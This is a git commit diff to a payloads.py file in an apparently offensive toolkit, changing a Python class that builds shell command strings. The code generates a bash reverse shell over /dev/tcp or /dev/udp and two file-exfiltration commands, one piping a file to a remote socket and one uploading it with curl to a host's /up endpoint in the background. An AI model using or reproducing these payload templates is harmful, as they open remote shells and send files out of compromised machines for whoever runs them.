ddfca75865a91e6260efe3e64e8d057f81230eb2
witchdocsec <107813117+witchdocsec@users.noreply.github.com>
2023-06-12 17:57:34 +0100

    Update payloads.py

--- lib/payloads.py
+++ lib/payloads.py
@@ -1,12 +1,13 @@
 class Shells:
 	class Rev:
 		def bash(ip,port,shell,protocol):
-			return f"{shell} -i >& /dev/{protocol}/{ip}/{port} 0>&1 &"
+			return f"bash -c \\\"{shell} -i >& /dev/{protocol}/{ip}/{port} 0>&1 & \\\";"
 class Exfil:
 	def socket(ip,port,file):
 		return f"cat {file} &> /dev/tcp/{ip}/{port} ;"
 	def pflask(ip, port, file):
 		return f"bash -c \\\"curl -F 'file=@{file}' http://{ip}:{port}/up &> /dev/null &\\\"; "
+
 
 
 
